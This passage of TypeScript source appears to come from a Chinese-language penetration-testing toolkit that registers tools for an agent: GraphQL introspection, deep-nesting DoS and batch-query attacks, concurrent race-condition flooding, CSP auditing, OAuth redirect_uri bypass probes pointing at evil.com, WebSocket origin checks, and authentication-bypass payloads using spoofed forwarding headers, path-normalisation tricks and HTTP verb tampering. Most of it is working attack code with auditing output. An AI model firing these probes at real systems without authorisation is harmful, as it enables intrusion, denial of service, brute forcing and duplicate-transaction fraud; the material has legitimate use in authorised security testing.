          results.push(`  请求失败: ${resp.error}`);
        } else {
          try {
            const json = JSON.parse(resp.body);
            if (json.errors) {
              results.push(`  ⚠️ 内省被拒绝: ${JSON.stringify(json.errors).slice(0, 300)}`);
              const fullResp = await gqlRequest(fullIntroQuery);
              if (!JSON.parse(fullResp.body).errors) {
                results.push(`  🚨 注意：完整 IntrospectionQuery 可能可用！`);
              }
            } else if (json.data?.__schema) {
              results.push(`  ✅ 内省开启！可枚举所有类型和字段`);
              const types = json.data.__schema.types || [];
              const interesting = types.filter((t: any) =>
                /User|Admin|Auth|Login|Secret|Config|Role|Mutation|Query/i.test(t.name)
              ).slice(0, 20);
              results.push(`  Schema 共 ${types.length} 个类型`);
              if (interesting.length > 0) {
                results.push(`  敏感类型预览:\n${interesting.map((t: any) => `    • ${t.name} (${t.kind}) - ${t.fields ? t.fields.length : 0} 字段`).join("\n")}`);
              }

              const queryType = json.data.__schema.types.find((t: any) => t.kind === "OBJECT" && t.fields);
              if (queryType) {
                const fieldNames = (queryType.fields || []).map((f: any) => f.name);
                results.push(`  Query 根字段: ${fieldNames.slice(0, 30).join(", ")}${fieldNames.length > 30 ? "..." : ""}`);
              }
            }
          } catch (e: any) {
            results.push(`  响应非 JSON: ${resp.body.slice(0, 200)}`);
          }
        }
      }

      if (mode === "all" || mode === "ds") {
        results.push(`\n💥 [模式2/3] DoS 深递归嵌套查询测试`);
        function buildNested(depth: number): string {
          if (depth <= 0) return "id";
          return `user { ${buildNested(depth - 1)} }`;
        }
        const tests = [
          { name: "10层嵌套", q: `{ ${buildNested(10)} }`, depth: 10 },
          { name: "20层嵌套", q: `{ ${buildNested(20)} }`, depth: 20 },
          { name: "碎片查询(大叶子)", q: `{ __typename ${Array.from({ length: 50 }, (_, i) => `f${i}:__typename`).join(" ")} }` },
        ];

        for (const t of tests) {
          const start = Date.now();
          const resp = await gqlRequest(t.q);
          const elapsed = Date.now() - start;
          results.push(`  [${t.name}] → ${resp.statusCode} ${elapsed}ms ${resp.body.length}B`);
          try {
            const json = JSON.parse(resp.body);
            if (json.errors) {
              results.push(`    错误: ${JSON.stringify(json.errors).slice(0, 150)}`);
            }
          } catch { /* ignore */ }
          if (elapsed > 5000) {
            results.push(`    ⚠️ 响应耗时过长(${elapsed}ms)，可能存在 DoS 风险！`);
          }
        }
      }

      if (mode === "all" || mode === "batch_attack") {
        results.push(`\n📦 [模式3/3] 批量查询攻击测试 (batch=${batch_count})`);

        const singleQuery = args.query || "{ __typename }";
        const batchBody = JSON.stringify(
          Array.from({ length: batch_count }, (_, i) => ({
            id: i + 1, query: singleQuery,
          }))
        );

        const batchStart = Date.now();
        const batchResp = await makeRequest(url, "POST", {
          "Content-Type": "application/json",
        }, batchBody);
        const batchElapsed = Date.now() - batchStart;

        results.push(`  批量请求 ${batch_count} 条 → ${batchResp.statusCode} ${batchElapsed}ms ${batchResp.body.length}B`);

        try {
          const json = JSON.parse(batchResp.body);
          if (Array.isArray(json)) {
            results.push(`  ✅ 服务端接受数组形式批量查询！共 ${json.length} 个响应`);
            const errors = json.filter((r: any) => r.errors).length;
            results.push(`  其中错误响应: ${errors}/${json.length}`);
            if (errors < json.length / 2) {
              results.push(`  🚨 可用于：批量密码重置、多次尝试验证码、暴力破解、API 限流绕过`);
            }
          } else if (json.errors) {
            results.push(`  服务端拒绝批量: ${JSON.stringify(json.errors).slice(0, 200)}`);
          } else {
            results.push(`  响应: ${JSON.stringify(json).slice(0, 200)}`);
          }
        } catch {
          results.push(`  响应非 JSON 数组: ${batchResp.body.slice(0, 200)}`);
        }

        results.push(`  单条耗时 vs 批量对比: 批量${batch_count}条总耗时 ${batchElapsed}ms ≈ 每条 ${Math.floor(batchElapsed / batch_count)}ms`);
      }

      if (args.query) {
        results.push(`\n📝 执行自定义查询:\n${args.query.slice(0, 200)}\n`);
        const resp = await gqlRequest(args.query);
        results.push(`状态码: ${resp.statusCode} | ${resp.body.length}B\n响应:\n${resp.body.slice(0, 1500)}${resp.body.length > 1500 ? "\n...(截断)" : ""}`);
      }

      return results.join("\n");
    },
  });

  registry.register({
    name: "race_condition",
    description: "竞态条件漏洞检测（高并发重复请求）- 可能产生副作用，需逐次确认",
    parameters: z.object({
      url: z.string().describe("目标 URL"),
      method: z.enum(["GET", "POST"]).default("POST").describe("HTTP 方法"),
      headers: z.record(z.string(), z.string()).optional().describe("请求头（含认证 Cookie/Token）"),
      body: z.string().describe("请求体"),
      concurrent_count: z.number().min(5).max(200).default(20).describe("并发请求数"),
      repeats: z.number().min(1).max(5).default(1).describe("重复轮数（每轮N并发，共N*R请求）"),
    }),
    category: "web",
    concurrent: false,
    requirePermission: true,
    execute: async (args: any) => {
      const { url, method = "POST", headers = {}, body, concurrent_count = 20, repeats = 1 } = args;
      const total = concurrent_count * repeats;
      const results: string[] = [];

      results.push(`[竞态条件测试] ${url}\n`);
      results.push(`⚠️ 警告：此测试可能产生副作用（重复扣款、重复创建等）\n`);
      results.push(`方法: ${method} | 并发: ${concurrent_count} | 轮数: ${repeats} | 总请求: ${total}\n`);
      results.push(`${"=".repeat(60)}\n`);

      const start = Date.now();
      const allResponses: any[] = [];

      for (let round = 0; round < repeats; round++) {
        results.push(`\n▶ 第 ${round + 1}/${repeats} 轮并发 ${concurrent_count} 个请求...`);
        const promises: Promise<any>[] = [];
        const roundStart = Date.now();

        for (let i = 0; i < concurrent_count; i++) {
          promises.push(
            makeRequest(url, method, { ...headers, "X-Request-Seq": `r${round}-${i}` }, body, 30000).then((r) => ({
              seq: i,
              round,
              time: Date.now() - roundStart,
              statusCode: r.statusCode,
              body: r.body,
              error: r.error,
            }))
          );
        }

        const roundResults = await Promise.all(promises);
        allResponses.push(...roundResults);

        const statusCounts: Record<number, number> = {};
        for (const r of roundResults) {
          statusCounts[r.statusCode] = (statusCounts[r.statusCode] || 0) + 1;
        }
        results.push(`  本轮耗时: ${Date.now() - roundStart}ms`);
        results.push(`  状态码分布: ${Object.entries(statusCounts).map(([s, c]) => `${s}×${c}`).join(", ")}`);

        const statuses = Object.keys(statusCounts).map(Number);
        if (statuses.length > 1) {
          results.push(`  ⚠️ 同轮出现多种状态码，可能存在竞态！`);
        }
      }

      const totalTime = Date.now() - start;
      results.push(`\n${"=".repeat(60)}\n📊 汇总结果（${total} 个请求，总耗时 ${totalTime}ms，平均 ${Math.floor(totalTime / total)}ms/请求）\n`);

      const overallStatus: Record<number, number> = {};
      const successCount: Record<string, number> = {};
      for (const r of allResponses) {
        overallStatus[r.statusCode] = (overallStatus[r.statusCode] || 0) + 1;
        if (r.statusCode >= 200 && r.statusCode < 300) {
          const snippet = r.body.replace(/\s+/g, " ").slice(0, 80);
          successCount[snippet] = (successCount[snippet] || 0) + 1;
        }
      }

      results.push(`总状态码分布:\n${Object.entries(overallStatus).map(([s, c]) => `  ${s}: ${c}次`).join("\n")}\n`);

      const successResp = Object.entries(successCount).filter(([, c]) => c > 1);
      if (successResp.length > 0) {
        results.push(`⚠️ 重复成功响应（${successResp.length} 种）:\n`);
        for (const [snippet, count] of successResp.slice(0, 10)) {
          results.push(`  ×${count} → "${snippet}"\n`);
        }
        results.push(`🚨 建议：如果是下单/领券/抽奖等操作，成功次数>1可能存在竞态漏洞！`);
      }

      results.push(`\n📋 前 ${Math.min(20, allResponses.length)} 个请求明细:\n`);
      results.push(`  #  | 轮 | 耗时ms | 状态 | Body前200字符\n`);
      results.push(`  ${"-".repeat(100)}\n`);
      for (let i = 0; i < Math.min(20, allResponses.length); i++) {
        const r = allResponses[i];
        const bodyShort = (r.body || "").replace(/\s+/g, " ").slice(0, 200);
        results.push(`  ${String(i).padStart(3)} |  ${r.round + 1} | ${String(r.time).padStart(6)} |  ${r.statusCode} | ${bodyShort}${r.error ? ` [ERR:${r.error}]` : ""}\n`);
      }

      results.push(`\n💡 竞态常见场景：优惠券领取、余额/积分扣减、抽奖、文件上传覆盖、注册重名`);
      return results.join("");
    },
  });

  registry.register({
    name: "csp_audit",
    description: "Content-Security-Policy (CSP) 安全审计：识别 unsafe-inline、通配符、nonce 预测等风险",
    parameters: z.object({
      url: z.string().describe("目标 URL"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url } = args;
      const res = await makeRequest(url, "GET", {});
      if (res.error) return `[CSP审计错误] ${res.error}`;

      const results: string[] = [];
      results.push(`[CSP 审计] ${url}\n状态码: ${res.statusCode}\n${"=".repeat(60)}\n`);

      const cspHeader = res.headers["content-security-policy"] || res.headers["content-security-policy-report-only"];
      const xcsp = res.headers["x-content-security-policy"];
      const metaMatch = res.body.match(/<meta[^>]+http-equiv=["']content-security-policy["'][^>]*content=["']([^"']+)["']/i);
      const metaCsp = metaMatch ? metaMatch[1] : null;

      if (!cspHeader && !xcsp && !metaCsp) {
        results.push(`🚨 严重：完全未设置 CSP 策略！\n`);
        results.push(`建议: 添加 Content-Security-Policy: default-src 'self'\n`);
        return results.join("");
      }

      const sources: Array<{ name: string; value: string }> = [];
      if (cspHeader) sources.push({ name: "Content-Security-Policy", value: cspHeader });
      if (res.headers["content-security-policy-report-only"]) sources.push({ name: "Content-Security-Policy-Report-Only", value: res.headers["content-security-policy-report-only"] });
      if (xcsp) sources.push({ name: "X-Content-Security-Policy (Legacy)", value: xcsp });
      if (metaCsp) sources.push({ name: "<meta> CSP", value: metaCsp });

      for (const src of sources) {
        results.push(`\n📋 [${src.name}]:\n`);
        const directives = src.value.split(/;\s*/).filter(Boolean);
        const risks: string[] = [];

        for (const directive of directives) {
          const parts = directive.trim().split(/\s+/);
          const name = parts[0].toLowerCase();
          const values = parts.slice(1);
          results.push(`  ${name}: ${values.join(" ") || "(空)"}`);

          if (values.includes("'unsafe-inline'") && !/script-src|style-src/.test(name)) continue;

          if (values.includes("'unsafe-inline'")) {
            if (/script-src/.test(name)) {
              const hasNonce = values.some((v) => v.startsWith("'nonce-"));
              const hasHash = values.some((v) => v.startsWith("'sha"));
              if (!hasNonce && !hasHash) {
                risks.push(`${name} 允许 'unsafe-inline' 且无 nonce/hash，完全可被 XSS 利用`);
              } else {
                risks.push(`${name} 允许 'unsafe-inline'（但有 nonce/hash，CSP3 中会被忽略）`);
              }
            } else {
              risks.push(`${name} 允许 'unsafe-inline'`);
            }
          }

          if (values.includes("'unsafe-eval'")) {
            risks.push(`${name} 允许 'unsafe-eval'，可被 XSS 利用 eval/Function`);
          }

          if (values.includes("data:")) {
            risks.push(`${name} 允许 data: URI，可能被用于 XSS (script 加载 data:text/javascript) 或资源混淆`);
          }

          if (values.includes("blob:")) {
            risks.push(`${name} 允许 blob: URI，可能被用于 DOM-XSS 或弹窗绕过`);
          }

          for (const v of values) {
            if (v === "*" && name !== "form-action" && name !== "frame-ancestors") {
              risks.push(`${name} 使用通配符 *，任意源均可加载该类资源`);
            }
            if (/^https?:\/\*$/.test(v)) {
              risks.push(`${name} 使用 ${v}，通配整个协议（所有 http/https 站点）`);
            }
            if (v.startsWith("*.")) {
              const tld = v.slice(2);
              if (["com", "net", "org", "io", "cn", "co", "info"].includes(tld)) {
                risks.push(`${name} 使用 ${v}，范围过大，子域名可申请注册绕过`);
              }
            }
            if (v.startsWith("'nonce-")) {
              const nonce = v.slice(7, -1);
              if (nonce.length < 16) {
                risks.push(`${name} nonce 过短 (${nonce.length}字节)，可能可预测`);
              }
              if (/^[a-f0-9]{8,}$/i.test(nonce) && nonce.length <= 16) {
                risks.push(`${name} nonce 疑似简单哈希/低熵，可能可预测`);
              }
            }
          }
        }

        if (!directives.some((d) => d.trim().toLowerCase().startsWith("frame-ancestors"))) {
          risks.push("缺少 frame-ancestors 指令，无法替代 X-Frame-Options 防御点击劫持");
        }
        if (!directives.some((d) => d.trim().toLowerCase().startsWith("object-src"))) {
          risks.push("缺少 object-src 指令，默认按 default-src，建议设为 'none' 阻止 Flash/Java");
        }
        if (!directives.some((d) => d.trim().toLowerCase().startsWith("base-uri"))) {
          risks.push("缺少 base-uri 指令，可能被 <base href> 注入篡改相对路径");
        }
        if (!directives.some((d) => d.trim().toLowerCase().startsWith("form-action"))) {
          risks.push("缺少 form-action 指令，表单可提交到任意域（钓鱼利用）");
        }

        results.push(`\n⚠️ 风险点 (${risks.length}):\n`);
        if (risks.length === 0) {
          results.push(`  ✅ 未发现明显风险\n`);
        } else {
          for (let i = 0; i < risks.length; i++) {
            results.push(`  ${i + 1}. ${risks[i]}\n`);
          }
        }
      }

      return results.join("");
    },
  });

  registry.register({
    name: "saml_oauth_audit",
    description: "SAML/OAuth/OIDC 安全审计：redirect_uri 校验不严、PKCE 缺失、state 预测等",
    parameters: z.object({
      url: z.string().describe("登录/授权跳转端点（含 ?client_id 等参数）"),
      mode: z.enum(["redirect_uri", "pkce", "state", "all"]).default("all").describe("测试模式"),
      redirect_uri: z.string().optional().describe("期望的合法 redirect_uri，用于比对"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, mode = "all", redirect_uri } = args;
      const results: string[] = [];
      const findings: string[] = [];

      results.push(`[SAML/OAuth 审计] ${url}\n模式: ${mode}\n${"=".repeat(60)}\n`);

      const parsedUrl = new URL(url);
      const clientId = parsedUrl.searchParams.get("client_id");
      const origRedirectUri = redirect_uri || parsedUrl.searchParams.get("redirect_uri");
      const origState = parsedUrl.searchParams.get("state");
      const responseType = parsedUrl.searchParams.get("response_type");
      const codeChallenge = parsedUrl.searchParams.get("code_challenge");
      const nonce = parsedUrl.searchParams.get("nonce");

      results.push(`📋 URL 参数提取:\n`);
      results.push(`  client_id: ${clientId || "未提供"}\n`);
      results.push(`  redirect_uri: ${origRedirectUri || "未提供"}\n`);
      results.push(`  state: ${origState ? origState.slice(0, 50) + (origState.length > 50 ? "..." : "") : "未提供"}\n`);
      results.push(`  response_type: ${responseType || "未提供"}\n`);
      results.push(`  code_challenge: ${codeChallenge || "未启用 PKCE"}\n`);
      results.push(`  nonce: ${nonce || "未提供"}\n\n`);

      if (mode === "all" || mode === "pkce") {
        results.push(`🔐 [PKCE 检查]\n`);
        if (codeChallenge) {
          const method = parsedUrl.searchParams.get("code_challenge_method") || "plain";
          results.push(`  ✅ 已启用 code_challenge (method=${method})\n`);
          if (method === "plain") {
            results.push(`  ⚠️ 使用 plain 模式，建议使用 S256\n`);
          }
        } else {
          results.push(`  ⚠️ 未使用 PKCE code_challenge，Authorization Code 可能被劫持\n`);
          findings.push("PKCE code_challenge 未启用，存在授权码截获风险");
        }
        results.push(``);
      }

      if (mode === "all" || mode === "state") {
        results.push(`🔑 [State 参数检查]\n`);
        if (origState) {
          let entropy = 0;
          const s = origState;
          if (/^[a-f0-9]+$/i.test(s)) entropy = s.length * 4;
          else if (/^[A-Za-z0-9_-]+$/.test(s)) entropy = s.length * 6;
          else entropy = s.length * 5;

          results.push(`  state 长度: ${s.length} 字符, 估计熵: ~${entropy} bit\n`);
          if (entropy < 128) {
            results.push(`  ⚠️ state 熵过低 (<128bit)，可能可预测/可暴力破解\n`);
            findings.push(`state 熵不足 (~${entropy}bit)，CSRF 防护弱`);
          } else {
            results.push(`  ✅ state 熵充足\n`);
          }
          const base64Decoded = (() => { try { return Buffer.from(s, "base64").toString(); } catch { return null; } })();
          if (base64Decoded && /[\x20-\x7E]{10,}/.test(base64Decoded)) {
            results.push(`  ⚠️ state base64 解码可读: "${base64Decoded.slice(0, 80)}..."，可能泄露内部结构\n`);
          }
        } else {
          results.push(`  🚨 缺少 state 参数！无 CSRF 防护，存在登录 CSRF\n`);
          findings.push("state 参数缺失，存在登录 CSRF 漏洞");
        }
        results.push(``);
      }

      if (mode === "all" || mode === "redirect_uri") {
        results.push(`🔗 [redirect_uri 校验测试]\n`);

        if (origRedirectUri) {
          try {
            const orig = new URL(origRedirectUri);
            const bypassTests = [
              { name: "HTTPS 攻击者域名", uri: "https://evil.com/callback" },
              { name: "子域名前缀", uri: orig.origin.replace("://", "://evil.") + orig.pathname },
              { name: "域名后缀匹配", uri: `${orig.origin}.evil.com${orig.pathname}` },
              { name: "参数注入", uri: `${origRedirectUri}?param=evil` },
              { name: "Fragment 注入", uri: `${origRedirectUri}#evil` },
              { name: "路径遍历", uri: `${orig.origin}/../callback` },
              { name: "开放重定向", uri: `${orig.origin}/redirect?url=https://evil.com` },
              { name: "HTTP 降级", uri: origRedirectUri.replace("https://", "http://") },
              { name: "同域不同端口", uri: `${orig.origin.replace(/:\d+$/, "")}:9999${orig.pathname}` },
              { name: "@ 攻击者域名", uri: `${orig.origin}@evil.com${orig.pathname}` },
              { name: `路径添加 .evil.com`, uri: `${orig.protocol}//${orig.hostname}.evil.com${orig.pathname}` },
            ];

            for (const t of bypassTests) {
              const testUrl = new URL(url);
              testUrl.searchParams.set("redirect_uri", t.uri);
              const start = Date.now();
              const res = await makeRequest(testUrl.toString(), "GET", { "Accept": "text/html" }, undefined, 10000);
              const elapsed = Date.now() - start;

              let verdict = "✓ 被拒绝";
              if (res.statusCode === 200) {
                verdict = "⚠️ 返回200，可能接受";
              } else if (res.statusCode === 302 || res.statusCode === 301 || res.statusCode === 303 || res.statusCode === 307) {
                const location = res.headers["location"] || "";
                if (location.startsWith(t.uri.split("?")[0]) || location.includes("evil.com")) {
                  verdict = "🚨 高危！实际跳转到恶意redirect_uri";
                  findings.push(`${t.name} 绕过成功，Location: ${location.slice(0, 120)}`);
                } else if (location.includes("code=") || location.includes("error=")) {
                  verdict = "⚠️ 返回授权响应，可能绕过";
                }
              } else if (res.statusCode >= 400 && res.statusCode < 500) {
                verdict = "✓ 校验失败 (4xx)";
              } else if (res.body && /invalid.*redirect|redirect.*uri.*mismatch|not.*match|白名单|redirect_uri.*error/i.test(res.body)) {
                verdict = "✓ 返回错误信息";
              } else if (elapsed > 5000) {
                verdict = `⚠️ 异常耗时 ${elapsed}ms`;
              }

              results.push(`  [${t.name}] ${res.statusCode} ${elapsed}ms → ${verdict}\n`);
              results.push(`     URI: ${t.uri}\n`);
              if (res.statusCode >= 300 && res.statusCode < 400 && res.headers["location"]) {
                results.push(`     Location: ${res.headers["location"]}\n`);
              }
            }
          } catch (e: any) {
            results.push(`  解析原始 redirect_uri 失败: ${e.message}\n`);
          }
        } else {
          results.push(`  ℹ️ 无 redirect_uri 参数，跳过校验绕过测试\n`);
        }
      }

      if (findings.length > 0) {
        results.push(`\n🚨 汇总发现 ${findings.length} 个安全问题:\n${findings.map((f, i) => `  ${i + 1}. ${f}`).join("\n")}\n`);
        results.push(`\n建议修复:\n` +
          `  1. redirect_uri 精确匹配（不要前缀/后缀/正则/包含）\n` +
          `  2. 强制启用 PKCE S256\n` +
          `  3. state 使用 ≥128bit 安全随机数，服务端绑定会话\n` +
          `  4. OIDC 使用 nonce 防重放\n`);
      } else {
        results.push(`\n✅ 未发现明显配置漏洞\n`);
      }

      return results.join("");
    },
  });

  registry.register({
    name: "websocket_audit",
    description: "WebSocket 安全审计：握手分析、Origin 校验、未授权消息发送",
    parameters: z.object({
      url: z.string().describe("WebSocket 地址 (ws:// 或 wss://)"),
      mode: z.enum(["test", "handshake", "all"]).default("all").describe("测试模式"),
      origin: z.string().optional().describe("自定义 Origin 头"),
      msg: z.string().optional().describe("要发送的测试消息（JSON/文本）"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, mode = "all", origin, msg } = args;
      const results: string[] = [];

      const toHttp = url.replace(/^ws:\/\//, "http://").replace(/^wss:\/\//, "https://");
      const wsProto = url.startsWith("wss:") ? "https:" : "http:";
      const parsedWs = new URL(toHttp);

      results.push(`[WebSocket 审计] ${url}\n协议: ${wsProto.replace(":", "")} | 模式: ${mode}\n${"=".repeat(60)}\n`);

      if (mode === "all" || mode === "handshake") {
        results.push(`\n🤝 [握手分析]\n`);

        const key = Buffer.from(Math.random().toString(36).slice(2)).toString("base64");
        const baseHeaders: Record<string, string> = {
          "Upgrade": "websocket",
          "Connection": "Upgrade",
          "Sec-WebSocket-Version": "13",
          "Sec-WebSocket-Key": key,
        };

        const handshakeScenarios = [
          { name: "正常握手", addOrigin: origin || `${wsProto}//${parsedWs.hostname}`, desc: "浏览器同源行为" },
          { name: "恶意 Origin", addOrigin: "https://evil.com", desc: "测试 Origin 校验" },
          { name: "Null Origin", addOrigin: "null", desc: "沙箱 iframe / 自定义客户端" },
          { name: "无 Origin 头", addOrigin: "", desc: "非浏览器客户端" },
        ];

        for (const s of handshakeScenarios) {
          const headers = { ...baseHeaders };
          if (s.addOrigin) headers["Origin"] = s.addOrigin;
          const res = await makeRequest(toHttp, "GET", headers, undefined, 10000);
          results.push(`\n  ▶ [${s.name}] (${s.desc})`);
          results.push(`    状态码: ${res.statusCode}`);
          if (res.error) {
            results.push(`    错误: ${res.error}`);
            continue;
          }

          const upgrade = (res.headers["upgrade"] || "").toLowerCase();
          const connection = (res.headers["connection"] || "").toLowerCase();
          const accept = res.headers["sec-websocket-accept"];

          if (res.statusCode === 101 && upgrade === "websocket" && connection.includes("upgrade")) {
            results.push(`    ✅ 握手成功！Switching Protocols 101`);
            if (accept) results.push(`    Sec-WebSocket-Accept: ${accept.slice(0, 30)}...`);
            if (s.name === "恶意 Origin" || s.name === "Null Origin") {
              results.push(`    ⚠️ 接受了非可信 Origin 的握手！可能存在 CORS/CSWSH 漏洞`);
            }
          } else if (res.statusCode === 403 || res.statusCode === 400 || res.statusCode === 401) {
            results.push(`    ✅ 握手被拒绝 (${res.statusCode})，有 Origin 校验`);
          } else {
            results.push(`    响应: ${res.statusCode} Upgrade=${upgrade || "无"} Connection=${connection || "无"}`);
            const snippet = res.body.slice(0, 200).replace(/\n/g, " ");
            if (snippet) results.push(`    Body: ${snippet}`);
          }
        }

        results.push(`\n  响应头 (正常握手):\n`);
        const normH = { ...baseHeaders, Origin: origin || `${wsProto}//${parsedWs.hostname}` };
        const normRes = await makeRequest(toHttp, "GET", normH);
        for (const [k, v] of Object.entries(normRes.headers)) {
          if (/websocket|upgrade|origin|sec-|set-cookie/i.test(k)) {
            results.push(`    ${k}: ${v}\n`);
          }
        }
      }

      if (mode === "all" || mode === "test") {
        results.push(`\n📡 [消息发送测试]\n`);
        results.push(`  尝试通过 curl --http1.1 发送原始 WebSocket 帧...\n`);

        const testMessage = msg || JSON.stringify({ type: "ping", time: Date.now() });

        const tryCurlWs = (): Promise<string> => new Promise((resolve) => {
          try {
            const curlOrigin = origin || `${wsProto}//${parsedWs.hostname}`;
            const cmd = [
              "curl",
              "--no-buffer",
              "--http1.1",
              "-s",
              "-N",
              "-i",
              "-H", `Origin: ${curlOrigin}`,
              "-H", "Connection: Upgrade",
              "-H", "Upgrade: websocket",
              "-H", "Sec-WebSocket-Version: 13",
              "-H", `Sec-WebSocket-Key: ${Buffer.from("test123456789").toString("base64")}`,
              "--max-time", "8",
              url,
            ].map((s) => `'${s.replace(/'/g, "'\\''")}'`).join(" ");

            child_process.exec(cmd, { timeout: 10000, encoding: "utf8" }, (err, stdout, stderr) => {
              const out = (stdout || "") + (stderr ? "\n[stderr]\n" + stderr : "");
              resolve(out.slice(0, 2000));
            });
          } catch (e: any) {
            resolve(`curl 调用失败: ${e.message}`);
          }
        });

        const rawOutput = await tryCurlWs();
        results.push(`  curl 原始输出:\n    ${rawOutput.replace(/\n/g, "\n    ").slice(0, 1500)}${rawOutput.length > 1500 ? "\n    ...(截断)" : ""}\n`);

        if (/101\s+Switching\s+Protocols/i.test(rawOutput) || /Upgrade:\s*websocket/i.test(rawOutput)) {
          results.push(`  ✅ curl 成功建立握手 (101 Switching Protocols)\n`);
        } else if (/403|401|400/.test(rawOutput)) {
          results.push(`  ⚠️ 握手被拒绝\n`);
        }

        results.push(`\n  💡 发送测试消息 "${testMessage.slice(0, 50)}...":\n`);
        results.push(`    由于原生 WebSocket 帧构造复杂，建议使用:\n`);
        results.push(`    - wscat -c "${url}" --origin "${origin || "https://evil.com"}"\n`);
        results.push(`    - 浏览器 console: ws = new WebSocket("${url}"); ws.onmessage=e=>console.log(e.data); ws.send(\`${testMessage.slice(0, 100)}\`)\n`);
      }

      results.push(`\n建议检查:\n` +
        `  - 是否校验 Origin 白名单（CSWSH 防护）\n` +
        `  - 是否需要认证 Cookie/Token（未授权访问）\n` +
        `  - 是否有消息速率限制（DoS）\n` +
        `  - 是否对消息进行鉴权（越权）\n`);

      return results.join("");
    },
  });

  registry.register({
    name: "auth_bypass",
    description: "认证绕过测试：Header 伪造、路径混淆、HTTP 动词篡改 (403/401→2xx)",
    parameters: z.object({
      url: z.string().describe("被保护的 URL（应返回 401/403）"),
      headers: z.record(z.string(), z.string()).optional().describe("基本请求头（Cookie 等）"),
      mode: z.enum(["header_override", "path_bypass", "verb_tamper", "all"]).default("all").describe("绕过模式"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, headers = {}, mode = "all" } = args;
      const results: string[] = [];
      const bypassHits: Array<{ name: string; status: number; detail: string }> = [];

      results.push(`[认证绕过测试] ${url}\n模式: ${mode}\n${"=".repeat(60)}\n`);

      results.push(`\n📡 基准请求（确认基线状态）:\n`);
      const baseline = await makeRequest(url, "GET", headers);
      results.push(`  状态码: ${baseline.statusCode} | 响应大小: ${baseline.body.length}B\n`);

      const protectedCodes = [401, 403];
      if (!protectedCodes.includes(baseline.statusCode)) {
        results.push(`  ⚠️ 基准请求未返回 401/403 (实际 ${baseline.statusCode})，已可访问或需 Cookie\n`);
      }

      const parsed = new URL(url);
      const basePath = parsed.pathname;
      const baseOrigin = `${parsed.protocol}//${parsed.host}`;

      if (mode === "all" || mode === "header_override") {
        results.push(`\n🎭 [Header 覆盖绕过]\n`);

        const headerTests: Array<{ name: string; headers: Record<string, string> }> = [
          { name: "X-Forwarded-For: 127.0.0.1", headers: { "X-Forwarded-For": "127.0.0.1" } },
          { name: "X-Original-URL 路径覆盖", headers: { "X-Original-URL": basePath } },
          { name: "X-Rewrite-URL 路径覆盖", headers: { "X-Rewrite-URL": basePath } },
          { name: "X-Forwarded-Host: 127.0.0.1", headers: { "X-Forwarded-Host": "127.0.0.1" } },
          { name: "X-Forwarded-Proto: https", headers: { "X-Forwarded-Proto": "https" } },
          { name: "X-Real-IP: 127.0.0.1", headers: { "X-Real-IP": "127.0.0.1" } },
          { name: "X-Custom-IP-Authorization: 127.0.0.1", headers: { "X-Custom-IP-Authorization": "127.0.0.1" } },
          { name: "Referer: 自身", headers: { "Referer": baseOrigin + basePath } },
          { name: "X-Originating-IP", headers: { "X-Originating-IP": "127.0.0.1" } },
          { name: "X-Remote-IP", headers: { "X-Remote-IP": "127.0.0.1" }, },
          { name: "X-Remote-Addr", headers: { "X-Remote-Addr": "127.0.0.1" } },
          { name: "Authorization 空令牌", headers: { "Authorization": "Bearer " } },
          { name: "Cookie 去除", headers: {} },
        ];

        for (const t of headerTests) {
          const mergedH: Record<string, string> = { ...headers };
          for (const [k, v] of Object.entries(t.headers)) {
            if (v === "" && t.name === "Cookie 去除") {
              delete mergedH["cookie"];
              delete mergedH["Cookie"];
            } else {
              mergedH[k] = v;
            }
          }
          const res = await makeRequest(url, "GET", mergedH);
          const hit = protectedCodes.includes(baseline.statusCode) && res.statusCode >= 200 && res.statusCode < 300;
          const line = `  [${t.name}] → ${res.statusCode} (${res.body.length}B)`;
          results.push(hit ? `  🚨${line} ✅ 可能绕过！` : `  ${line}`);
          if (hit) bypassHits.push({ name: t.name, status: res.statusCode, detail: JSON.stringify(t.headers) });
        }
      }

      if (mode === "all" || mode === "path_bypass") {
        results.push(`\n🛤 [路径混淆/规范化绕过]\n`);

        const pathVariants: Array<{ name: string; path: string }> = [];
        const addP = (name: string, p: string) => pathVariants.push({ name, path: p });

        addP("原始路径", basePath);
        addP("末尾追加 ;/", `${basePath};/`);
        addP("末尾追加 %2f", `${basePath}%2f`);
        addP("末尾追加 //", `${basePath}//`);
        addP("末尾追加 /.", `${basePath}/.`);
        addP("末尾追加 /;/", `${basePath}/;/`);
        addP("末尾追加 /.random", `${basePath}/.anything`);
        addP("末尾 ..", `${basePath}..`);
        addP("前导 //", `/${basePath.replace(/^\//, "")}/`);
        addP("大小写翻转", basePath.split("/").map((seg) =>
          seg === "" ? "" : seg[0].toUpperCase() + seg.slice(1).toLowerCase()
        ).join("/"));
        addP("URL 编码一次", encodeURI(basePath));
        addP("路径末尾加 ?something", `${basePath}?test=1`);
        addP("# 锚点", `${basePath}#`);
        addP("/%2e%2e/", basePath.replace(/\/$/, "") + "/%2e%2e/");

        for (const pv of pathVariants) {
          const testUrl = `${baseOrigin}${pv.path}${parsed.search}`;
          const res = await makeRequest(testUrl, "GET", headers);
          const hit = protectedCodes.includes(baseline.statusCode) && res.statusCode >= 200 && res.statusCode < 300;
          const line = `  [${pv.name}] ${pv.path.slice(0, 50)} → ${res.statusCode}`;
          results.push(hit ? `  🚨${line} ✅ 路径绕过！` : `  ${line}`);
          if (hit) bypassHits.push({ name: `Path: ${pv.name}`, status: res.statusCode, detail: pv.path });
        }
      }

      if (mode === "all" || mode === "verb_tamper") {
        results.push(`\n🔧 [HTTP 动词篡改 (Method Tampering)]\n`);

        const methods = [
          "GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT",
          "CUSTOM", "FOO", "HACK", "TEST", "DEBUG", "INVENTED",
        ];

        for (const m of methods) {
          const res = await makeRequest(url, m, headers, m === "POST" || m === "PUT" || m === "PATCH" ? "" : undefined);
          const hit = protectedCodes.includes(baseline.statusCode) && res.statusCode >= 200 && res.statusCode < 300;
          const line = `  [${m.padEnd(8)}] → ${res.statusCode}`;
          results.push(hit ? `  🚨${line} ✅ 动词绕过！` : `  ${line}`);
          if (hit) bypassHits.push({ name: `Method: ${m}`, status: res.statusCode, detail: `HTTP ${m}` });
        }

        results.push(`\n  特殊：X-HTTP-Method-Override 头覆盖\n`);
